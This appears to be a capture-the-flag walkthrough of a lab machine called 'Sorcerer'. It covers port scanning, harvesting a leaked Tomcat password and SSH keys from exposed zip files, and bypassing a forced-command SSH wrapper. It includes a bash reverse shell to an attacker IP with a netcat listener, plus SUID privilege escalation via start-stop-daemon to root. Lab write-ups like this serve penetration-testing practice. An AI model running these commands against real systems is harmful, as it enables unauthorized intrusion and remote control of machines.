																							               Sorcerer Walkthrough
																										
Attacker's Machine: 192.168.45.5
Victim's Machine: 192.168.201.100
export IP=192.168.201.100
	
nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s

22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
7742/tcp  open  msss
33603/tcp open  unknown
41637/tcp open  unknown
42193/tcp open  unknown
59253/tcp open  unknown

nmap -Pn -n -sC -sV -p22,80,111,2049,7742,33603,31637,42193,59253 $IP --open --stats-every=5s -oN results.txt

22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http     nginx
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      41637/tcp   mountd
|   100005  1,2,3      52180/udp   mountd
|   100021  1,3,4      42193/tcp   nlockmgr
|   100021  1,3,4      58389/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
7742/tcp  open  http     nginx
|_http-title: SORCERER
33603/tcp open  mountd   1-3 (RPC #100005)
42193/tcp open  nlockmgr 1-4 (RPC #100021)
59253/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux;

nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000

111/udp   open   rpcbind
2049/udp  open   nfs
 
 Vulnerability Assessment

nmap -n $IP -p 7742 -sV --script vuln --stats-every=5s 

nikto --url $IP

Port 80
 <!-- nothing -->
 
Port 7742
http://192.168.204.100:7742/                  # Login page

nmap -n $IP -p 7742 -sV --script vuln --stats-every=5s 
/default/: Potentially interesting folder
/zipfiles/: Potentially interesting folder w/ directory listing

http://192.168.204.100:7742/zipfiles/

# Found 4 zip files, maybe these's are valid usernames on the machine ?? 

francis.zip    
max.zip   
miriam.zip 
sofia.zip  

# Max folder
cat tomcat-users.xml.bak
  <user username="tomcat" password="VTUD2XxJjf5LPmu6" roles="manager-gui"/>
  
# Private SSH keys are present as well for max users, let's try for SSH.

unzip max.zip
cd /home/max/.ssh
ls 
-rw-r--r-- 1 root root  836 Sep 24  2020 authorized_keys
-rw-r--r-- 1 root root 3381 Sep 24  2020 id_rsa
-rw-r--r-- 1 root root  738 Sep 24  2020 id_rsa.pub

chmod 400 id_rsa
ssh -i id_rsa max@$IP
PTY allocation request failed on channel 0
ACCESS DENIED.
usage: scp [-346BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file]
           [-l limit] [-o ssh_option] [-P port] [-S program] source ... target
Connection to 192.168.201.100 closed.

# Aparently there is a configuration or script that runs before any SSH Connection. Let's check the scp_wrapper.sh and authorization_keys file.

cat scp_wrapper.sh
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in                     # The case statement evaluates a series of patterns (in this case, strings) to match against the value of $SSH_ORIGINAL_COMMAND.
 'scp*)                                                                # This is a pattern that matches any string that starts with the characters "scp". The * is a wildcard that matches any number of characters after "scp".
    $SSH_ORIGINAL_COMMAND
    ;;                                                                   # End of this case statement.
 *)
    echo "ACCESS DENIED."
    SCP
    ;;
esac                                                                    # This signifies the end of the case statement.

Method 1:

cat authorization_keys
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer

# There are rules and a specific command that is ran when we try to connect to SSH. Let's remove there rules from the authorization_keys and use SCP to upload the new file and overwrite the file on the server which will allow us to connect to the server. 

cat authorization_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer

# Now let's try to overwrite the keys on the server using SCP

scp -i id_rsa authorized_keys max@$IP:/home/max/.ssh/authorized_keys
scp: Received message too long 1094927173
scp: Ensure the remote shell produces no output for non-interactive sessions.

# "Received message too long" means that your SFTP client received bad data from the SFTP server. The typical reason is that the shell startup scripts on the server (.bashrc, .profile, .cshrc, etc.) are producing some output, and your SFTP client is trying to parse that output as an SFTP message. You can check this by running the command:
   ssh -i id_rsa max@$IP 'echo hello'
   ACCESS DENIED.
    If this produces any output other than the "hello", then that output would probably prevent SFTP or SCP from working properly.
# Now that we know that, we can use the SCP flag -O .

-O  Use the legacy SCP protocol for file transfers instead of the SFTP protocol.  Forcing the use of the SCP protocol may be necessary for servers that do not implement SFTP, for backwards-compatibility for particular filename wildcard patterns and for expanding paths with a ‘~’ prefix for older SFTP servers.

scp -O -i id_rsa authorized_keys max@$IP:/home/max/.ssh/authorized_keys
authorized_keys                                                                                                                             100%  738    13.8KB/s   00:00 

# Now that we've modified the authorized_keys file, let's try to connect normally with SSH using the id_rsa key.

ssh -i id_rsa max@$IP                                                  
max@sorcerer:~$             # Got shell

cd /home/denis
cat local.txt                           # Flag: f611792b7aada743b5d75b8685f6b61c

Method 2:

#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    bash -i >& /dev/tcp/192.168.18.11/443 0>&1
    ;;
esac

scp -i .ssh/id_rsa scp_wrapper.sh max@192.168.120.29:/home/max/

nc -nlvp 443

ssh -i .ssh/id_rsa max@192.168.120.29
PTY allocation request failed on channel 0
ACCESS DENIED.

Got shell! 

Privilege escalation

find / -perm -u=s -type f 2>/dev/null

/usr/sbin/start-stop-daemon
/usr/bin/vmware-user-suid-wrapper                             # waste of time

# Look for it on gtfobins

/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
# whoami
root
cd /root
cat proof.txt                                                            # Flag: 1054c0d0338d4ef2090b8ba1280a42ee       
